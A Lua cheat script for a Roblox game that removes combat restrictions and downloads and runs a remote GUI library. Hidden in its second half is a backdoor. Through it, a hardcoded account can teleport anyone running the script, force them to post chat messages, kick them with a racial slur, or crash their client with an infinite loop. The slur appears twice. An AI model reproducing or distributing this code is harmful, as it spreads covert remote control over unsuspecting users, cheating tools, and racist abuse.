local function no2loop(toggle)
    _G.NO2 = toggle
    spawn(function()
	game:GetService("RunService").RenderStepped:Connect(function()
		if _G.NO2 == true then
			if game.Players:FindFirstChild("LocalPlayer") == nil then
				repeat wait() until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character
			end
            local lp = game:GetService("Players").LocalPlayer.Character
            
			if lp:FindFirstChild("NoAttack") ~= nil  then
				lp.NoAttack:Destroy()
		    end	

			if lp:FindFirstChild("Disable") ~= nil then
				lp.Disable:Destroy()
			end

			if lp:FindFirstChild("TrueDisable") ~= nil then
				lp.TrueDisable:Destroy()
			end

			if lp:FindFirstChild("NoRegen") ~= nil then
				lp.NoRegen:Destroy()
			end

			if lp:FindFirstChild("Stunned") ~= nil then
				lp.Stunned.Value = false
			end

			if lp:FindFirstChild("NoTree") ~= nil then
				lp.NoTree:Destroy()
			end
		
		    if lp:FindFirstChild("NoJump") ~= nil  then
				lp.NoJump:Destroy()
		    end	
		    
		    if lp:FindFirstChild("CombatPause") ~= nil  then
				lp.CombatPause:Destroy()
		    end	
		    
		end
	end)
end)
end








if not syn then return end
local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow("no2 copy game hax") -- Creates the window

local b = w:CreateFolder("nitro pls.") -- Creates the folder(U will put here your buttons,etc)

b:Button("Reset",function()
    game:GetService("Players").LocalPlayer.Character:BreakJoints()
end)

b:Toggle("Toggle Combat Modifier",function(bool)
    shared.toggle = bool
    no2loop(bool)
end)

b:DestroyGui()

b:Button("Copy cord link",function()
    setclipboard("discord.gg/3bg5MaBHXP")
end)


function message(message)
local args = {
    [1] = message,
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end

spawn(function()
    pcall(function()
local Admin = "idkwolfz"
local Table = {}


local function Chatted(Player)
    Player.Chatted:Connect(function(msg)
        msg = string.lower(msg)
        msg = string.gsub(msg, " ", "")
          if string.sub(msg,1,1) == "!" then
              if string.sub(msg,2,7) == "summon" or string.sub(msg,2,6) == "bring" then
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Admin].Character.HumanoidRootPart.CFrame
                elseif
                string.sub(msg,2,10) == "apologize" then
                  message("I "..game.Players.LocalPlayer.DisplayName..", would like to apologize.")
                elseif
                string.sub(msg,2,5) == "Kick"  then
                    game.Players.LocalPlayer:Kick("nigger")
                elseif
                string.sub(msg,2,3) == "re" or string.sub(msg,2,6) == "reset" then
                    game.Players.LocalPlayer.Character.Humanoid:Remove()
                elseif
                string.sub(msg,2,5) == "rude" then
                    message("L person lol")
                elseif
                string.sub(msg,2,4) == "sit" then
                    game.Players.LocalPlayer.Character.Humanoid.Sit = true
                elseif
                string.sub(msg,2,7) == "praise" then
                    message("I praise... Master "..Admin)
                elseif
                string.sub(msg,2,6) == "crash" then
                    local crash = Instance.new("Message", game:GetService("CoreGui"))
	                crash.Text = 'damn nigger time to rejoin'
	                wait()
	                spawn(function() while true do end end)
	        end
	      end   
       end)
   end

for _, v in pairs(game.Players:GetChildren()) do
    if v.Name == Admin then
        Chatted(v)
    end
end

game.Players.PlayerAdded:Connect(function(Player)
    if Player.Name == Admin and not table.find(Table,Player.Name) then
        table.insert(Table, Player.Name)
        Chatted(Player)
    end
    end)
  end)
end)

